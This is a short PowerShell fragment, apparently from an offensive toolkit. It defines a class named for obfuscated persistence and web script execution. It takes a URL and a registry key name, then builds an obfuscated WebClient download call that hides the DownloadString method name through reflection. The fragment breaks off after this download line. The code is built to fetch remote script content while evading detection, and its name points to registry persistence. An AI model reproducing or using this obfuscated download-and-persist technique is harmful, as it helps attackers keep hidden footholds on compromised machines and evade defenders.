Class ObfPersistenceExecuteScriptWeb5 {

    static Execute ([String]$url, [String]$rKeyName) {
        #Import Obfuscated script
        # ..\..\Download-File-Content\gen-obf\ObfDownloadFileContent5.ps1
        $DoAll = "(New-Object Net.WebClient).(((((New-Object Net.WebClient)).PsObject.Methods)|Where{(Get-Variable _).Value.Name-clike'D*g'}).Name).Invoke('$url')"
